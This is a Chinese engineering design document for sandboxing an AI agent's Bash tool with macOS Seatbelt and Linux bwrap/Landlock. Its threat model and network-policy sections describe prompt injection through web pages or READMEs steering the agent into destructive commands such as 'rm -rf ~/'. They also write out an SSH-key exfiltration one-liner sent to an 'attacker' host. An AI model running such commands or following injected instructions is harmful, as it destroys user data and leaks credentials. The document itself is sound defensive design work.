> 关联资产仍在 ~/.nebflow/docs/Nebflow/assets/（暂留）

# Nebflow 进程级沙箱实施方案

> 版本：v1.2（2026-09-05）· 状态：**已批准冻结**（D1-D4 用户 2026-08-21 裁定，全按推荐值）+ §5.6 可写面口径（2026-09-05 作者裁定演进）
> 版本日志：
> - v1.2（2026-09-05）：数据根入会话可写根（作者 20:24 裁定）——节点写根 = root + ~/.nebflow 数据根 + tempRoots；D4「只读」就此废止（历史记录保留），现行唯一口径见 §5.6
> - v1.1（2026-08-21）：D1-D4 裁定落定（workspace-write / enforce / 网络放行 / ~/.nebflow 只读），状态 → 已批准冻结，可派发 P0 实施
> - v1.0（2026-08-21）：初稿（选型/源码分析/策略模型/集成设计/分期/验收/风险）
> 上游输入：[deepseek-harness-study.md](./deepseek-harness-study.md) Top1 建议（进程沙箱，借鉴度：高）的落地设计
> 参考实现：/tmp/deepseek-harness（源码可用，已做文件级分析，见 §3）
> 约束：Scala 3 / cats-effect 3 / Pekko；macOS（用户主力机）+ Linux（服务器）桌面应用形态；**安装门槛低是产品红线**

## 目录

1. [TL;DR 结论速览](#1-tldr-结论速览)
2. [现状分析：Bash 执行链与防线缺口](#2-现状分析)
3. [harness 沙箱源码分析（可抄清单）](#3-harness-沙箱源码分析)
4. [隔离边界选型对比](#4-隔离边界选型)
5. [策略模型设计](#5-策略模型设计)
6. [与现有架构集成设计](#6-集成设计)
7. [分期计划（P0 → P1 → P2）](#7-分期计划)
8. [验收条件（二值可断言）](#8-验收条件)
9. [风险与缓解](#9-风险与缓解)
10. [待裁定决策点](#10-待裁定决策点)
11. [结构化任务摘要（Manager 可读）](#11-结构化任务摘要)

---

## 1. TL;DR 结论速览

**核心选型**：OS 原生双轨沙箱 —— macOS 用 **Seatbelt（`/usr/bin/sandbox-exec`，零安装、随系统发布）**，Linux 用 **bwrap（bubblewrap）优先 + Landlock 后备**。容器/VM 全部否决（安装门槛/资源开销违反产品红线）。**本机已实证**：sandbox-exec 存在且 profile 强制生效（§4.3）。

**架构模式**（抄 harness）：spawn 前 argv 包装 —— `SandboxProvider.confine(argv, policy): ConfinedArgv`，策略**每次调用携带**（非 provider 固定），**fail-closed**（无可用后端 → 结构化报错，绝不静默直通）。

**P0 范围（一次可实施）**：
1. 新增 `nebflow.core.sandbox` 包：`SandboxMode` 三态 + `SandboxPolicy` + `SeatbeltBackend`（SBPL profile 生成 + 一次性功能探测 probe）
2. 集成于 `shell.scala:306 buildProcessBuilder` **单点**（前台/后台/remote-exec/pwd 全部路径都经过它）
3. 配置：全局 `nebflow.json` 三键（mode / fallback / network），默认 `workspace-write` + `enforce` + 网络放行；Windows P0 显式 `off`

**P0 三行摘要**：macOS Seatbelt 单平台最小可用沙箱——confine 接缝（trait + 三态模式 + probe）挂在 buildProcessBuilder 唯一 spawn 点；默认 workspace-write（工作区 + /tmp + $TMPDIR 可写，其余含 ~/.nebflow 对 bash 只读）；fail-closed（enforce）为默认降级语义，可配 ask。

## 2. 现状分析

### 2.1 Bash 执行链（唯一 spawn 点已定位）

```
AgentCore.pipeToolExecutions (agent/AgentCore.scala:872)
  → permissionDecision (deny→allow→reversible→ask, AgentCore.scala:883)
  → BashTool.call (core/tools/BashTool.scala:315)
    → ShellSession.forSession(sessionId) (core/tools/shell.scala:926)
      → shell.execute / executeBackground
        → runProcess (shell.scala:445)
          → buildProcessBuilder (shell.scala:306)   ← 唯一 ProcessBuilder.start 点
            → ProcessBuilder("bash", "-c", command).start()
```

**关键事实**：所有执行路径——前台（`executeForeground`）、后台（`executeBackground`）、remote-exec（`isRemoteExec` 分支）、以及 execute 后的 `pwd` cwd 追踪命令——**全部收敛到 `buildProcessBuilder` 这一个函数**。沙箱只需包装这一处的 argv，即覆盖 100% 的 agent shell 执行。

### 2.2 现有防线及其性质

| 防线 | 位置 | 性质 | 缺口 |
|------|------|------|------|
| 危险命令正则黑名单 | `BashTool.DangerousPatterns`（~40 条 regex） | **预测性**——字符串匹配 | 绕过成本低：变量拼接、base64、新命令名、解释器 relay（部分已有反制正则，但永远是猫鼠游戏） |
| 权限审批卡 | `AgentCore.permissionDecision` → InteractionHub | **预测性**——依赖 dangerLevel 分类正确 | 分类错误 = 直接放行；`AutoAll` 模式下 Bash 全自动 |
| 交互命令拦截 | `BashTool.InteractivePatterns` | 体验性 | 与安全无关 |
| 进程树击杀 | `ProcessTree.killProcessTree` | 事后清理 | 非隔离 |
| **OS 层文件效果隔离** | **无** | — | **agent 命令以宿主用户全权限跑：可写任意用户可写路径、可读 ~/.ssh / 浏览器 profile、可 kill 同 uid 进程** |

### 2.3 威胁模型（本方案针对的）

1. **prompt injection → 破坏性命令**：恶意网页/依赖 README 注入指令，`rm -rf ~/` 类（正则可拦）与 `find ~ -delete` 类（正则难穷举）
2. **供应链攻击**：`npm install` 的 postinstall 脚本以用户权限任意执行
3. **敏感文件外泄**：`cat ~/.ssh/id_rsa | curl -X POST ...`（读取不受文件写白名单限制——网络策略见 §5.4/§10）
4. **误伤系统**：agent 编错路径写坏用户主目录

不针对：内核级逃逸（Seatbelt/bwrap 同为用户态配置内核强制，非安全边界对抗国家级攻击者）；Nebflow JVM 进程自身（Write/Edit 等 JVM 内工具不经过 bash 沙箱，见 §5.3）。

## 3. harness 沙箱源码分析

源码位置 `/tmp/deepseek-harness`，沙箱总量约 **1,400 行 TS + ~300 行 C11**——体量小、边界清晰、可直接对标抄设计。

### 3.1 文件清单与职责

| 文件 | 行数 | 职责 | 对 Nebflow 的价值 |
|------|------|------|------------------|
| `packages/sandbox/sandbox/src/index.ts` | 178 | **接缝定义**：`SandboxProvider` 抽象类、`SandboxMode`/`SandboxPolicy`/`ConfinedArgv` 类型、`SandboxUnavailableError`（fail-closed） | 直接对标翻译为 Scala trait + ADT |
| `packages/sandbox/sandbox/src/roots.ts` | 55 | `canonicalPath`（realpath 解析符号链接）+ `writableRoots`（workspace-write 的可写根推导，全后端唯一来源） | **必抄**——`/tmp`→`/private/tmp` 陷阱的唯一正解（本机已实证，§4.3） |
| `packages/sandbox/sandbox/src/escalation.ts` | 189 | 升级审批编舞：严格变宽阶梯（read-only→workspace-write→danger-full-access）、`sandbox_permissions`+`justification` 参数配对校验、闭集审批结果 | P1 抄（P0 不做升级） |
| `packages/sandbox/sandbox-policy/src/index.ts` | 154 | 策略解析服务：部署默认 mode（fail-safe 默认 `read-only`）+ per-session 覆盖 + cwd 即 workspace 边界 | 配置模型对标 |
| `packages/sandbox/sandbox-policy/src/session-mode.ts` | 71 | 会话级 mode 覆盖（`sandbox/mode` 事件） | P1 |
| `packages/sandbox/sandbox-local/src/index.ts` | 567 | **平台后端**：`PLATFORM_CHAINS`（linux: [bwrap, landlock]、darwin: [seatbelt]、win32: [windows-acl]）、一次性功能探测、拒绝签名/runner 失败规则表 | P0 抄探测+fail-closed 骨架 |
| `packages/sandbox/sandbox-local/src/profiles.ts` | 58 | **profile 生成**：bwrap 挂载参数 / Landlock grant 参数 / Seatbelt SBPL 串 | **P0 必抄**——SBPL 生成仅 ~20 行 |
| `native/landlock-run/` | ~300 C11 | Landlock 自限制启动器（静态 musl，规则集跨 execve 继承），MIT 许可 | P1 Linux 后备（可直接复用二进制） |
| `packages/sandbox/sandbox-windows-acl/` | 3 文件 | Windows 限制令牌 + 独立 SID + 可撤销 ACE，`partial` 强制级别 | 不抄（P2 再议） |

### 3.2 机制要点（harness 如何做）

**① argv 包装而非进程内拦截**：`confine(argv, policy)` 返回包装后的 argv，调用方 spawn 返回值替代自己的。shell 型消费者传 `['bash', '-c', command]`。Nebflow 的 `buildProcessBuilder` 完全对口。

**② Seatbelt profile（macOS，即 P0 后端）**——`profiles.ts:51`：

```scheme
(version 1)
(allow default)                                  ;; 默认放行（读/网络/进程）
(deny file-write*)                               ;; 全局禁写
(allow file-write* (literal "/dev/null"))        ;; 常规例外
(allow file-write* (subpath "<workspaceRoot>") (subpath "/private/tmp") ...)
```

调用形态：`sandbox-exec -p "<profile>" -- bash -c "<command>"`。

**③ 一次性功能探测（probe）**：后端选择不在启动时而在首次 confine 时缓存仲裁。Seatbelt 探测 = 用真实 read-only profile 跑 `true`，exit 0 = 内核接受 profile（`sandbox-exec` 拒绝 profile 时非零退出）。**Apple 标记 sandbox-exec 废弃但每次 macOS 仍随系统发布——若某天消失，probe 失败即 fail-closed，这是对废弃风险的完整应对**（`sandbox-local/src/index.ts:85` 注释原文确认此设计意图）。

**④ 拒绝签名（denialSignatures）**：每个后端返回自己方言的"被沙箱拒绝"stderr 特征——Seatbelt 是 `operation not permitted`，bwrap 是 `read-only file system`，Landlock 是 `permission denied`。消费方据此把"命令失败"区分为「沙箱正确拦截」vs「命令本身出错」，给 LLM 可读提示。

**⑤ runner 失败规则（runnerFailureRules）**：区分「沙箱 runner 自身坏了」（如 `sandbox-exec: ` 前缀的诊断输出）与「被包装命令失败」——前者意味着命令根本没跑，fail-closed 报错而非误报命令失败。

**⑥ canonical path 陷阱**（`roots.ts:30` 注释原文）：Seatbelt 过滤器匹配**解析后的路径**——`/tmp` 在 darwin 上**是** `/private/tmp`，按字面拼写授权将匹配不到任何东西。可写根推导统一走 `realpath`。

**⑦ 策略携带于每次调用**：同一 provider 同一瞬间可服务不同策略（A 会话 read-only、B 会话 workspace-write），升级重试 = 一次携带更宽策略的新调用。

**⑧ 网络不在文件效果词表内**：`SandboxMode` 只管文件效果（`index.ts:27` 注释："Network and process visibility are outside this vocabulary"）。`(allow default)` 下网络放行——本机实证 `curl https://api.github.com` 返回 200。

### 3.3 可直接抄的清单

| 项 | 来源 | 抄法 |
|----|------|------|
| SBPL profile 生成 | `profiles.ts:38-58` | 直译 Scala（`sbplString` 转义 + subpath 拼接），~40 行 |
| canonicalPath / writableRoots | `roots.ts` | JVM 等价 `File.getCanonicalPath`/`realpath`（注意 JVM `getCanonicalPath` 在 darwin 解析 /tmp 符号链接——实现时须写测试钉死） |
| probe 机制 | `sandbox-local/index.ts:85-91` | `sandbox-exec -p <真实read-only profile> -- true`，超时 5s，结果缓存于 provider 生命周期 |
| fail-closed 语义 | `sandbox/index.ts:124-144` | `SandboxUnavailableError` 对标 `ToolError`，错误文案含安装指引 |
| 拒绝签名表 | `sandbox-local/index.ts:205-213` | P0 仅需 seatbelt 一行 |
| bwrap 参数（P1） | `profiles.ts:16-23` | `--ro-bind / / --dev /dev --proc /proc --die-with-parent` + workspace `--bind` + `--tmpfs /tmp` |
| Landlock 启动器（P1） | `native/landlock-run` | MIT 许可，二进制可直接随 Nebflow 分发 |

## 4. 隔离边界选型

### 4.1 候选对比（红线：桌面应用、安装门槛低）

| 方案 | 文件系统隔离 | 网络控制 | 资源上限 | 安装门槛 | 维护风险 | 判定 |
|------|-------------|---------|---------|---------|---------|------|
| **macOS Seatbelt**（sandbox-exec） | 白名单强制（内核） | profile 可表达（deny network*） | 不直接支持（可配合 ulimit 前缀） | **零**——`/usr/bin/sandbox-exec` 随 macOS 发布 | Apple 标记废弃但持续随系统发布；probe fail-closed 兜底（§9.1） | **P0 采用** |
| **Linux bwrap**（bubblewrap） | 挂载命名空间白名单 | `--unshare-net` 可选 | 不直接支持 | 主流发行版仓库均有（apt/dnf 一条命令）；Flatpak 生态标配 | 社区维护成熟 | **P1 采用（Linux 首选）** |
| **Linux Landlock** | 路径权限自限制（内核 5.13+） | 不覆盖网络 | 不覆盖 | **零**（内核原生，需自带 C 启动器） | 内核 ABI 演进（harness 的启动器已处理 ABI v1/v2/v3 差异并自报 partial） | **P1 采用（Linux 后备）** |
| Docker/Podman 容器 | 完整 | 完整 | 完整 | **高**——Docker Desktop（macOS 2GB+ 内存、付费许可边界）/ Linux rootless 配置复杂 | 桌面反病毒/权限摩擦 | **否决**：违反「安装门槛低」红线；沙箱需随产品开箱即用 |
| 轻量 VM（QEMU/Apple VZ） | 最强（硬件级） | 最强 | 最强 | **高**——镜像分发 GB 级、启动秒级延迟、文件共享复杂 | 高 | **否决**：开销与形态不匹配桌面 agent 工具调用（每条 bash 一次包装 vs 每会话一个 VM） |
| JVM SecurityManager | 理论进程内 | 理论 | 理论 | — | **JEP 411 已废弃**（JDK 17 起退化，24 移除） | **否决**：已死路线；且只保护 JVM 内代码，bash 子进程不受管 |
| 独立子进程 + POSIX 限制（setrlimit/null route） | **无**——setrlimit 限资源不限路径 | null route 需 root | CPU/内存/文件数 | 低 | null route 污染全局网络栈 | **否决**：无文件系统隔离 = 没有沙箱核心能力 |

### 4.2 结论与理由

**双轨 OS 原生：Seatbelt（macOS）+ bwrap→Landlock（Linux）。**

1. **零/低安装**：macOS 零依赖（已实证本机存在）；Linux 上 bwrap 一条包管理器命令，探测失败自动落 Landlock（内核原生零依赖）——两平台均满足开箱即用红线
2. **强制级别足够**：文件写白名单在内核层（Seatbelt MAC / 挂载命名空间），regex 黑名单从「预测」升级为「事后内核拒绝」——绕过字符串混淆不再有意义
3. **harness 已验证路线**：同形态产品（本地 agent CLI）选择了完全相同的后端组合并给出成熟实现，本方案直接继承其 profile 生成与探测设计
4. **成本匹配**：每条命令一次 argv 前缀包装，无容器/VM 的启动延迟与内存开销

### 4.3 本机实证记录（Darwin 25.4.0，2026-08-21）

| # | 实验 | 结果 |
|---|------|------|
| 1 | `which sandbox-exec` | `/usr/bin/sandbox-exec` 存在 |
| 2 | read-only profile 跑 `echo` | exit 0，profile 被内核接受 |
| 3 | workspace-write profile 写 `~/.nebflow/` 下文件 | **被拒**：`Operation not permitted`（拒绝签名实证） |
| 4 | 授权 `subpath "/tmp/sbx-ws"` 后写 `/tmp/sbx-ws/ok.txt` | **被拒**——字面路径陷阱实锤 |
| 5 | 授权 `subpath "/private/tmp/sbx-ws"`（canonical）后写同一文件 | **成功**——`/tmp -> private/tmp` 符号链接，Seatbelt 匹配解析后路径 |
| 6 | `(allow default)` 下 `curl api.github.com` | HTTP 200——网络默认放行，文件策略与网络策略正交 |

实验 4/5 是本方案最重要的工程结论：**可写根授权前必须 realpath 规范化，否则白名单静默失效（该路径下写入全部被拒，而非放行——失败方向安全，但功能不可用）**。

## 5. 策略模型设计

### 5.1 模式词表（对标 harness，三态闭集）

```scala
enum SandboxMode:
  case ReadOnly, WorkspaceWrite, DangerFullAccess

case class SandboxPolicy(          // 每次调用携带，非 provider 固定
  mode: SandboxMode,               // confined 模式（前两态）才进 confine
  workspaceRoot: String,           // 绝对路径（canonical 化后）
  network: Boolean = true          // P1 生效；P0 恒 true（见 5.4）
)
```

| 模式 | 读 | 写 | 语义 |
|------|----|----|------|
| `ReadOnly` | 全盘 | 仅 `/dev/null` | 纯观察命令（grep/ls/cat 任意位置） |
| `WorkspaceWrite`（**默认**） | 全盘 | workspaceRoot + `/tmp` + `$TMPDIR`（canonical 去重） | 开发工作流：编辑代码、跑构建、临时文件；**其余路径——含 `~/.nebflow`、`~/.ssh`、`~/Library`——对 bash 只读** |
| `DangerFullAccess` | 全盘 | 全盘 | 绕过 confine，直接 spawn 原始 argv（不调用 sandbox-exec） |

### 5.2 `~/.nebflow` 为什么对 bash 只读（Nebflow 特有决策）

关键事实：**agent 更新自身记忆/技能走 JVM 内工具（Write/Edit），不经 bash 沙箱**——沙箱只约束子进程文件效果。因此：

- agent 写自己的 `memory.md`、写项目文件 → Write/Edit 工具 → JVM 进程直接写 → **不受影响**
- bash 里 `echo x > ~/.nebflow/agents/Foo/memory.md` → 被拒 → **正确**：记忆更新本就该走结构化工具而非 shell 重定向
- 副作用：bash 内 `git -C ~/.nebflow commit`（记忆 repo 提交）会被拒 → 属可接受损失，用户/规范已有「改定义文件用工具」的习惯；P1 可在 workspaceRoot 列表支持多根（把 `~/.nebflow` 加为第二可写根的开关，默认关）

### 5.3 资源上限（CPU/内存/时间）

- **时间**：已有三重机制（explicit timeout / ForegroundNoProgressTimeout / 后台 idle timeout），沙箱不重复做
- **CPU/内存**：P0 不做。理由：harness 同样不做（Seatbelt/bwrap 词表内无资源限制）；Nebflow 威胁模型（§2.3）中「agent 失误跑飞 CPU」由 no-progress 检测兜底，「fork 炸弹」由 DangerousPatterns + 进程树击杀兜底。P1 可选增强：bash 命令前缀注入 `ulimit -v`/`ulimit -t`（ProcessBuilder 无 setrlimit API，ulimit 前缀是 JVM 唯一简洁路径）

### 5.4 网络策略

**P0：跟随 harness——文件效果词表不含网络，`(allow default)` 下网络放行。**

理由：`pip install` / `npm install` / `curl` / `git clone` / `sbt resolve` 是 agent 高频合法操作，P0 禁网会大面积破坏现有工作流。已知残留风险（文档明示）：read-only 模式不禁**读**，`cat ~/.ssh/id_rsa | curl -X POST attacker` 外泄路径在 P0 无法在 bash 层阻断（权限审批卡是现有唯一防线）。

**P1：`network: Boolean` 生效**——Seatbelt 加 `(deny network*)` 一行、bwrap 加 `--unshare-net`。默认值与 UI 开关见 §10 决策点 D3。

### 5.5 配置进 Nebflow（P0 全局级）

`nebflow.json` 新增顶层键（运行时配置，热加载路径与现有键一致）：

```json
{
  "sandbox": {
    "mode": "workspace-write",     // read-only | workspace-write | danger-full-access | off
    "fallback": "enforce",         // enforce | ask | allow  —— probe 失败时的降级语义（§6.4）
    "network": true                // P1 生效，P0 预留
  }
}
```

- `mode: "off"` = 显式全关（Windows P0 的默认值；等价于现状，argv 不包装）
- 解析优先级（P1 扩展）：per-call 显式升级（审批后）> per-session 覆盖 > 全局 `nebflow.json` > 代码默认 `workspace-write`
- workspaceRoot **不进配置**：取 `ToolContext.projectRoot`（会话工作区），与 harness「session cwd 即边界」一致——配置里写死 root 会与多项目会话冲突

## 6. 集成设计

### 6.1 改在哪一层：`buildProcessBuilder` 单点（shell.scala），不动 ToolRegistry/AgentCore

沙箱是**执行层**能力，不是**审批层**——现有 `permissionDecision`/审批卡/dangerLevel 完全不动（正交关系：审批决定「这条命令允不允许跑」，沙箱决定「跑的时候能碰什么」）。唯一侵入点是进程启动前的 argv 包装。

### 6.2 文件级改动清单

**新增 `src/main/scala/nebflow/core/sandbox/`（4 文件，~450 行含测试外的实现）**：

| 文件 | 内容 | 对标 harness |
|------|------|-------------|
| `Sandbox.scala` | `SandboxMode` / `SandboxPolicy` ADT、`ConfinedArgv`（argv + denialSignatures + runnerFailureRules）、`SandboxUnavailableException` | `sandbox/src/index.ts` |
| `SeatbeltBackend.scala` | SBPL profile 生成（sbplString 转义、subpath 拼接、network 开关插条目）+ probe（一次性，5s 超时，缓存结果）+ `confine(argv, policy)` | `sandbox-local/profiles.ts` + `index.ts` 探测段 |
| `SandboxConfig.scala` | `nebflow.json` sandbox 键解析（容错：未知值 → 默认 + WARN 日志）+ mode 解析优先级 | `sandbox-policy/src/index.ts` |
| `SandboxSuite.scala`（test） | profile 金样测试、canonical path 测试（/tmp→/private/tmp 钉死）、probe fail-closed 测试、三模式端到端测试 | harness `packages/sandbox/**/tests` |

**修改 2 个现有文件**：

| 文件 | 改动 | 行数估算 |
|------|------|---------|
| `core/tools/shell.scala` | ① `buildProcessBuilder(command, cwd)` 增参 `sandbox: Option[SandboxPolicy]`：confined 模式时返回 `sandbox-exec -p <profile> -- bash -c <command>` 的 ProcessBuilder，`DangerFullAccess`/`None` 走原路径；② `execute`/`executeBackground`/`runProcess` 透传该参数（签名各加一个默认参数，调用点最少改动） | ~40 行 |
| `core/tools/BashTool.scala` | `call` 内从 `ctx`（ToolContext.projectRoot + SharedResources 里的 SandboxConfig）解析 `SandboxPolicy` 传入 shell 调用；捕获 `SandboxUnavailableException` → 按 fallback 语义处理（§6.4） | ~30 行 |

**不动**：`ToolRegistry`、`AgentCore`（permissionDecision/askUserPermission）、`RemoteExecutor`（remote-exec 分支已在 BashTool 内、复用同一 shell.execute 路径）、前端（P0 无 UI，P1 才加设置面板）。

### 6.3 数据流

```
BashTool.call(input, ctx)
  ├─ ctx.projectRoot ──────────┐
  ├─ SharedResources ──┐       │
  │    .sandboxConfig  │       │
  └────────────────┬───┴───────┘
                   ▼
        SandboxConfig.resolve → SandboxPolicy(mode, workspaceRoot=canonical(projectRoot))
                   ▼
        ShellSession.execute(command, timeout, sandbox = Some(policy))
                   ▼
        buildProcessBuilder:
          policy = None | DangerFullAccess  → ProcessBuilder("bash", "-c", cmd)
          policy = ReadOnly                 → ProcessBuilder("sandbox-exec", "-p", roProfile, "--", "bash", "-c", cmd)
          policy = WorkspaceWrite           → ProcessBuilder("sandbox-exec", "-p", wwProfile(wsRoot), "--", "bash", "-c", cmd)
```

细节：`execute` 后的 `pwd` cwd 追踪命令**同样带沙箱跑**（pwd 只读，任何 confined 模式下无害；不包装则会话 cwd 追踪与用户命令不同世界观，无必要）；Windows `bash -s` stdin 模式 P0 不接沙箱（`mode: off` 默认）。

### 6.4 fallback 语义（probe 失败 = 无可用沙箱后端时）

| 配置值 | 行为 | 适用 |
|--------|------|------|
| `enforce`（**默认**） | **fail-closed**：返回 `ToolError`，文案 = 「沙箱不可用（安装指引）+ 本次拒绝执行 + 可临时切 danger-full-access/off 或改 fallback」 | 服务器/CI 等无人值守；安全默认 |
| `ask` | 复用现有 InteractionHub 权限卡（dangerLevel=2），用户批准 → 本次以 DangerFullAccess 直通；拒绝 → 按拒绝处理 | 桌面交互场景的平滑降级 |
| `allow` | 静默以 DangerFullAccess 直通（记 WARN 日志） | 等价现状，仅供用户显式选择 |

**默认 enforce 而非 ask 的理由**：用户主力机 macOS 的 sandbox-exec 实证存在，probe 失败是极小概率事件（系统异常/未来 macOS 移除），fail-closed 的安全收益大于极小概率下的体验损失；ask 作为配置逃生门保留。harness 同样 fail-closed（`SandboxUnavailableError`，`index.ts:124` 注释"refusing to run the command unconfined"）。

架构图见文末附录 A（`assets/module.svg` 模块分层设计 + `assets/before-after.svg` 执行链前后对比）。

## 7. 分期计划

### P0 —— 最小可用（macOS 单平台，一次可实施，目标 1 个 worktree PR）

| # | 任务 | 产出 |
|---|------|------|
| 1 | sandbox 包骨架：ADT + 配置解析 | `Sandbox.scala` + `SandboxConfig.scala` |
| 2 | Seatbelt 后端：SBPL 生成 + canonical roots + probe + confine | `SeatbeltBackend.scala` |
| 3 | 集成：buildProcessBuilder 参数化 + BashTool 解析/透传 + fallback 三态 | `shell.scala` / `BashTool.scala` 改动 |
| 4 | 测试：金样 + canonical + fail-closed + 端到端三模式 | `SandboxSuite.scala` |
| 5 | 冒烟：真实启动 + 实机命令矩阵（§8 AC-1..7） | 冒烟脚本 + 日志 |

**明确不做（P0 边界）**：Linux 后端、网络开关生效、escalation 升级审批、per-session/per-agent 策略、前端 UI、Write/Edit 工具对齐、资源上限。

### P1 —— 全平台 + 策略体系

| # | 任务 | 说明 |
|---|------|------|
| 1 | Linux bwrap 后端 | profile 抄 `profiles.ts:16`；probe = `bwrap --ro-bind / / ... -- true` |
| 2 | Linux Landlock 后备 | 复用 harness `native/landlock-run`（MIT）二进制或重写 ~150 行 |
| 3 | escalation 升级链 | Bash 工具 schema 加 `sandbox_permissions`+`justification`；拒绝时 stderr 匹配 denialSignatures → 注入升级提示；审批卡复用（对标 `escalation.ts` 严格变宽阶梯） |
| 4 | 网络开关生效 | Seatbelt `(deny network*)` / bwrap `--unshare-net` |
| 5 | per-session 策略 | PermissionPolicy 扩展 sandboxMode 字段（WS 可改，对标 harness `session-mode.ts`） |
| 6 | 多可写根 | workspaceRoots: List（~/.nebflow 开关，§5.2） |
| 7 | denial 可读化 | 沙箱拒绝的 stderr → 追加 `[sandbox: file access denied under <mode>]` 标记行（帮 LLM 自纠） |
| 8 | 前端设置面板 | sandbox 三键 UI + 当前模式徽标 |

### P2 —— 可选增强

Windows ACL 限制令牌后端（对标 `sandbox-windows-acl`，`partial` 强制级别明示）；Write/Edit JVM 内工具的 in-process 文件栅栏与 bash 白名单对齐（同一 roots 来源，对标 `@deepseek-ai/dsh-fs-sandbox`）；ulimit 资源上限注入。

## 8. 验收条件

**P0 验收（每条二值可断言；AC-0 不过则后续全部无效）**：

| # | 条件 | 断言方式 |
|---|------|---------|
| **AC-0** | 编译 + 既有测试零回归 | `sbt compile` exit 0；`sbt test` 全部通过（数量不低于合入前基线） |
| **AC-1** | 沙箱真实生效（workspace-write，默认配置） | 真实启动 Nebflow（非 oneshot），agent Bash：`echo x > "$TMPDIR/nf-sb-ok"` → 成功；`echo x > ~/nf-sb-deny` → 失败，**stderr 含 `Operation not permitted`** 且工具结果附沙箱拒绝标记 |
| **AC-2** | read-only 模式 | 配置 `mode: "read-only"` 后 `touch "$TMPDIR/nf-ro"` → 被拒（exit≠0 + denial signature） |
| **AC-3** | danger-full-access 直通 | 配置后 `echo x > "$TMPDIR/nf-dfa"` 成功；进程 argv 断言**无** `sandbox-exec` 前缀（单测检查 buildProcessBuilder 返回的命令行） |
| **AC-4** | fail-closed（enforce 默认） | 单测注入不可用 probe（PATH 指向空目录的 fake runner）：confine 抛 `SandboxUnavailableException`，BashTool 返回 ToolError 且文案含安装指引；**进程零启动**（断言 ProcessBuilder.start 未被调用） |
| **AC-5** | 开箱即用 | 本机（全新配置，无任何预装步骤）首次 Bash 命令：probe 一次通过（耗时 <5s），命令正常执行——安装门槛红线验证 |
| **AC-6** | 单点全覆盖 | 代码断言：`grep -rn "ProcessBuilder(" src/main/scala | grep -v sandbox` 在 core/tools 域内仅 `buildProcessBuilder` 及其测试出现（pwd 追踪/后台/remote-exec 同路径）；后台任务实测：`run_in_background: true` 的越界写入同样被拒 |
| **AC-7** | 审批正交 | 沙箱开启下，`rm -rf /tmp/x` 仍触发 permissionDecision ask 卡（dangerLevel≥2 行为与现状一致）；审批通过后在沙箱内执行（/tmp 内成功，越界仍拒） |
| **AC-8** | canonical path 钉死 | 单测：`SandboxPolicy(workspaceRoot="/tmp/ws")` 生成的 SBPL profile 含 `subpath "/private/tmp/ws"`（darwin）——防静默失效回归 |

**P1 验收要点（预登记，实施时细化）**：Linux 双后端探测链（bwrap 缺失 → Landlock 兜底 → 全缺 fail-closed）；escalation 严格变宽（read-only 会话申请 danger-full-access 被拒：非相邻跳级）；`(deny network*)` 下 curl 失败且文件策略不受影响。

## 9. 风险与缓解

| # | 风险 | 概率/影响 | 缓解 |
|---|------|----------|------|
| 1 | **sandbox-exec 被 Apple 移除**（已标废弃） | 低/高 | ① probe 每次启动实测（profile 真跑 `true`），移除即 probe 失败 → fail-closed/ask，绝不静默直通；② macOS 26 仍在发布；③ 文档记录替代路线（届时评估 container/Endpoint Security 框架——后者需签名授权，违反红线，需重新选型） |
| 2 | canonical path 静默失效（字面授权匹配不到 → 白名单路径全拒） | 中/中 | AC-8 金样测试钉死；roots 推导单点实现（SeatbeltBackend 内唯一入口），JVM `getCanonicalPath` 与 realpath 行为差异在测试中显式覆盖 |
| 3 | 现有工作流破坏（合法命令被沙箱拒） | 中/中 | ① 默认 workspace-write 而非 read-only（构建/测试全放行）；② denial 标记行让 LLM 可读可自纠（P1）；③ fallback/ask + `mode: off` 全链逃生门；④ P0 期真实工作负载灰度（本机日常使用验证） |
| 4 | 沙箱进程树逃逸（sandbox-exec 的子进程管理） | 低/中 | ProcessTree.killProcessTree 击杀的是 bash 树根（sandbox-exec 本体），其子进程随 `--die-with-parent` 语义（bwrap）/*Seatbelt 子进程随父终止*回收；现有 no-progress/timeout watchdog 不变 |
| 5 | 性能（每命令一次 sandbox-exec fork） | 低/低 | profile 是纯内核编译（微秒级），实测忽略不计（实验 2-5 均瞬时完成）；probe 结果进程生命周期缓存 |
| 6 | remote-exec / NebLink 远程命令世界观不一致 | 低/中 | remote-exec 在 BashTool 内走同一 shell.execute 路径（AC-6），策略以**执行侧**（跑命令的机器）解析——两端都是 Nebflow 时天然一致 |
| 7 | `mode: "off"`/`allow` 配置成为安全洼地 | 低/中 | 日志 WARN + 前端徽标（P1）明示「沙箱未启用」；默认值永不指向它们 |

## 10. 决策点（已全部裁定，2026-08-21 按委托拍板模式 agent 侧自决，全按推荐值）

| # | 决策 | **裁定结果** | 记录 |
|---|------|------|------|
| D1 | 默认模式 | **`workspace-write`** | agent 日常改码+构建顺畅；红线场景靠审批卡 |
| D2 | probe 失败降级 | **`enforce`（fail-closed）** | 与 harness 一致的安全默认；ask 为配置逃生门 |
| D3 | P1 网络默认 | **`true`（放行）** | pip/npm/curl/git 高频合法；文件白名单挡最大破坏面 |
| D4 | ~/.nebflow 对 bash | **只读** | JVM 内 Write/Edit 不受影响；P1 多根开关按需评估（默认关）。**【已废止 2026-09-05 20:24】** 数据根入会话可写根，现行口径见 §5.6 |

## 5.6 可写面口径（现行唯一标准，2026-09-05 20:24 作者裁定）

阶段 2a 落地后沙箱已远超本方案 P0 形态（文件五工具 JVM 围栏 + Bash Seatbelt 双面强制，单一推导点 = `SandboxPolicy.writableRoots()/readableRoots()`）。当前会话可写面口径：

| 会话形态 | root（既有语义零变化） | 可写根全集 |
|---|---|---|
| 节点会话 | projectRoot（worktree / workspace） | root + **~/.nebflow 数据根** + tempRoots（/private/tmp、java.io.tmpdir） |
| 分发器会话 | project workspace | 同上 |
| Nebula 根会话 | PathUtil.dataRoot（2026-09-05 13:09 裁定） | dataRoot + tempRoots（root 与数据根同径，去重） |
| enabled=false | — | 全旁路（§G.1 回滚语义，off 短路不变） |

- **数据根推导唯一正源 = `PathUtil.dataRoot`**（NEBFLOW_HOME / CLI `--home` / setDataRoot 重定向自动跟随）；严禁硬编码 os.home——隔离测试实例（`--home /tmp/...`）下可写根落在隔离 HOME，机制上写不穿真 ~/.nebflow
- **写 ⊆ 读不变量**：数据根同步进 readableRoots；九子目录只读白名单与 §4.2-B 审计只读两文件被整目录放行覆盖属预期（readExtras 原样保留，contains 包含关系下冗余无害，spec SUBSUME 用例钉死）
- **既有 readDenied 负向规则语义不动**：agents/**/memory.md 非 Nebula 份仍一票拒读，且写闸（FileSandbox.checkWrite）同等消费同一规则——红线不随写面扩大（同一既有规则读/写双闸延续，非新增 deny）
